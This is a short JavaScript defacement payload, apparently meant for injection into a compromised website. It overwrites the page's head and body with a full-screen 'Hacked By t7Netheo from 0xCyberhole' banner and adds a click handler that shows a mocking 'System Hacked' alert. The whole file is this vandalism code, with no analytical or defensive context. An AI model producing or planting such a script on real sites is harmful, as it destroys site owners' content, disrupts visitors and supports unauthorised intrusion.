document.head.innerHTML = `<style>{
  margin: 0;
  padding: 0;
}
.hacked {
  background: black;
  color: lime;
  height: 100vh;
  
  display: flex;
  justify-content: center;
  align-items: center;

  text-align: center;
  font-size: 3rem;
}</style>`;

document.body.innerHTML = `
<div class="hacked">
  <h1>Hacked By t7Netheo from 0xCyberhole</h1>
</div>
`;

window.addEventListener('click', e => alert('Hehe, System Hacked by t7Netheo'));